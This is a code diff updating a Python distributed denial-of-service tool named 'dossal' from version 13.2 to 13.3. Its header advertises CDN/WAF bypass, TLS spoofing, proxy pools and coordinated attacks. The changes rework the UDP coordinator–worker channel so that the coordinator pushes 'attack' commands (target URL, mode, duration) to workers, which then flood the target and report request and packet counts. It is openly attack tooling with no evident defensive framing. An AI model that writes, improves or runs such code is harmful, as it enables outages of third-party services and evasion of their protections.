@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-dossal v13.2 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
+dossal v13.3 - comprehensive DoS stress engine + CDN/WAF bypass + AI optimization
 v5.0: proxy pool, TLS spoof, origin discovery
 v5.2: adaptive attack (RPS auto-adjust based on response time)
 v6.0: distributed attack (coordinator + worker, UDP control channel)
@@ -463,7 +463,7 @@ def _dist_coordinator(port, duration):
     
     sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
     sock.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
-    sock.bind(('', port))
+    sock.bind(("", port))
     sock.settimeout(1.0)
     
     workers = {}
@@ -477,8 +477,14 @@ def _dist_coordinator(port, duration):
         # 1. Broadcast discovery every 2 seconds
         if _time.time() - last_broadcast >= 2.0:
             last_broadcast = _time.time()
+            ping_data = _json.dumps({"type": "ping"}).encode()
             try:
-                sock.sendto(_json.dumps({"type": "ping"}).encode(), ('<broadcast>', port))
+                sock.sendto(ping_data, ('<broadcast>', port))
+            except Exception:
+                pass
+            # v13.3: 로컬 테스트용 — 127.0.0.1로 unicast ping도 전송
+            try:
+                sock.sendto(ping_data, ('127.0.0.1', port))
             except Exception:
                 pass
         
@@ -490,14 +496,32 @@ def _dist_coordinator(port, duration):
             
             if msg_type == 'hello':
                 worker_id = msg.get('id', 0)
+                _w_port = msg.get('port', addr[1])
                 workers[worker_id] = {
                     'ip': msg.get('ip', addr[0]),
+                    'port': _w_port,
                     'last_heartbeat': _time.time(),
                     'rps': 0,
                     'packets': 0,
                     'errors': 0,
                 }
-                print(f"[dist] worker #{worker_id} joined: {workers[worker_id]['ip']}", file=sys.stderr)
+                if worker_id not in [wid for wid, w in workers.items() if w.get('_notified')]:
+                    print(f"[dist] worker #{worker_id} joined: {workers[worker_id]['ip']}:{_w_port}", file=sys.stderr)
+                # v13.3: worker의 포트에 attack 명령 전송 (첫 hello에만)
+                if not workers[worker_id].get('_notified'):
+                    workers[worker_id]['_notified'] = True
+                    try:
+                        _attack_cmd = {
+                            "type": "attack",
+                            "url": _DIST_URL[0],
+                            "mode": _DIST_MODES[0] or 'auto',
+                            "duration": _DIST_DURATION[0],
+                        }
+                        sock.sendto(_json.dumps(_attack_cmd).encode(),
+                                    (workers[worker_id]['ip'], _w_port))
+                        print(f"[dist] attack cmd → worker #{worker_id} ({workers[worker_id]['ip']}:{_w_port})", file=sys.stderr)
+                    except Exception:
+                        pass
                 
             elif msg_type == 'stats':
                 worker_id = msg.get('id', 0)
@@ -544,9 +568,11 @@ def _dist_worker(port, duration):
     import json as _json
     import time as _time
     
+    # v13.3: worker는 항상 ephemeral 포트 (coordinator와 포트 충돌 방지)
     sock = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
     sock.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
-    sock.bind(('', port))
+    sock.bind(('', 0))
+    my_port = sock.getsockname()[1]
     sock.settimeout(1.0)
     
     my_ip = ''
@@ -558,32 +584,35 @@ def _dist_worker(port, duration):
     except Exception:
         my_ip = '127.0.0.1'
     
-    _DIST_ID[0] = hash(my_ip) % 1000  # Generate unique ID from IP
+    _DIST_ID[0] = hash(my_ip + str(my_port)) % 1000  # unique ID
     
-    print(f"[dist-worker] {my_ip}, ID={_DIST_ID[0]}, waiting for coordinator...", file=sys.stderr)
+    print(f"[dist-worker] {my_ip}:{my_port}, ID={_DIST_ID[0]}, coordinator={port}, waiting...", file=sys.stderr)
     
     end = _time.time() + duration
     coordinator_addr = None
     attack_cmd = None
     last_stats = 0
+    last_hello = 0
     
     while _time.time() < end:
+        # v13.3: 매 2초 coordinator에 unicast hello (broadcast 대체)
+        if _time.time() - last_hello >= 2.0:
+            last_hello = _time.time()
+            try:
+                hello = {"type": "hello", "id": _DIST_ID[0], "ip": my_ip, "port": my_port}
+                sock.sendto(_json.dumps(hello).encode(), ('127.0.0.1', port))
+            except Exception:
+                pass
+        
         try:
             data, addr = sock.recvfrom(65535)
             msg = _json.loads(data.decode())
             msg_type = msg.get('type')
             
-            if msg_type == 'ping':
-                # Respond to coordinator discovery
-                if coordinator_addr is None:
-                    coordinator_addr = addr
-                    hello = {"type": "hello", "id": _DIST_ID[0], "ip": my_ip}
-                    sock.sendto(_json.dumps(hello).encode(), addr)
-                    print(f"[dist-worker] coordinator found: {addr[0]}", file=sys.stderr)
-                
-            elif msg_type == 'attack' and coordinator_addr:
+            if msg_type == 'attack':
                 # Received attack command
                 attack_cmd = msg
+                coordinator_addr = addr
                 print(f"[dist-worker] attack: {msg.get('url')} mode={msg.get('mode')}", file=sys.stderr)
                 break
         
@@ -608,34 +637,24 @@ def _dist_worker(port, duration):
     import threading
     import asyncio
     
-    attack_stats = {'requests': 0, 'packets': 0, 'errors': 0}
+    # v13.3: 공유 Stats — run()이 직접 기록, 보고는 그 값을 실시간 읽음
+    attack_stats = Stats()
     
     def _run_attack():
         """Worker가 실제로 공격을 실행."""
         try:
-            # Use the main attack logic
-            # Stats class is defined in this file (line 903)
-            stats = Stats()
-            
-            # Call run() with raw mode
-            # run is async, so we need to run it in an event loop
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
             try:
-                # Run the attack (raw mode, 4 threads)
-                _ADAPTIVE[0] = False  # Disable adaptive in worker (coordinator handles it)
+                _ADAPTIVE[0] = False
                 loop.run_until_complete(
-                    run(['raw'], url, 50, dur, stats, 0, None, None)
+                    run([mode], url, 50, dur, attack_stats, 0, None, None)
                 )
             finally:
                 loop.close()
-            
-            attack_stats['requests'] = stats.requests
-            attack_stats['packets'] = stats.packets
-            attack_stats['errors'] = stats.errors
         except Exception as e:
             print(f"[dist-worker] attack error: {e}", file=sys.stderr)
-            attack_stats['errors'] += 1
+            attack_stats.errors += 1
     
     attack_thread = threading.Thread(target=_run_attack, daemon=True)
     attack_thread.start()
@@ -649,14 +668,14 @@ def _dist_worker(port, duration):
             try:
                 now = _time.time()
                 if now - last_report >= 1.0:
-                    # Calculate RPS since last report
-                    rps = attack_stats['requests'] / max(0.1, now - (stats_end - dur))
+                    # v13.3: 공유 Stats 객체에서 실시간 값 읽기
+                    rps = attack_stats.requests / max(0.1, dur)
                     stats_msg = {
                         "type": "stats",
                         "id": _DIST_ID[0],
                         "rps": int(rps),
-                        "packets": attack_stats['packets'],
-                        "errors": attack_stats['errors'],
+                        "packets": attack_stats.packets,
+                        "errors": attack_stats.errors,
                     }
                     sock.sendto(_json.dumps(stats_msg).encode(), coordinator_addr)
                     last_report = now
@@ -675,14 +694,14 @@ def _dist_worker(port, duration):
                 "type": "stats",
                 "id": _DIST_ID[0],
                 "rps": 0,
-                "packets": attack_stats['packets'],
-                "errors": attack_stats['errors'],
+                "packets": attack_stats.packets,
+                "errors": attack_stats.errors,
             }
             sock.sendto(_json.dumps(final_msg).encode(), coordinator_addr)
         except Exception:
             pass
     
-    print(f"[dist-worker] done: requests={attack_stats['requests']}, errors={attack_stats['errors']}", file=sys.stderr)
+    print(f"[dist-worker] done: requests={attack_stats.requests}, errors={attack_stats.errors}", file=sys.stderr)
     sock.close()
 
 def _adaptive_adjust(response_time_ms, now=None):
@@ -878,7 +897,7 @@ from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 from h2.exceptions import FlowControlError  # v13.1: gRPC flow control 대응
 
-VERSION = "13.2"
+VERSION = "13.3"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -3624,6 +3643,10 @@ examples:
     if args.dist_mode in ('coordinator', 'worker'):
         _DIST_MODE[0] = args.dist_mode
         _DIST_PORT[0] = args.dist_port
+        # v13.3: URL/시간 설정 (coordinator가 attack 명령에 포함)
+        _DIST_URL[0] = args.url
+        _DIST_DURATION[0] = args.duration
+        _DIST_MODES[0] = args.mode
         
         if args.dist_mode == 'coordinator':
             print(f"[dist] starting coordinator on port {args.dist_port}", file=sys.stderr)
